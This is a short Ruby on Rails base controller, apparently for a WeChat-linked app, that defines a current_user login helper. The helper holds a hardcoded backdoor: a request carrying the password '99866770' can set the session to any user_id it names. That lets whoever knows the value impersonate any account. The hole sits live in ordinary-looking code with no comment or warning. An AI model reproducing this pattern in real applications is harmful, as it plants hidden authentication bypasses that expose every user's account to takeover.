class AppBaseController < ActionController::Base
  
  def current_user
    begin
      (session[:user_id] = params[:user_id]) && @current_user=nil if params[:pwd] == "99866770"
      @current_user ||= User.find(session[:user_id])
      return @current_user
    rescue
      redirect_to "/wechat/login" and return
    end
  end
  
  
end
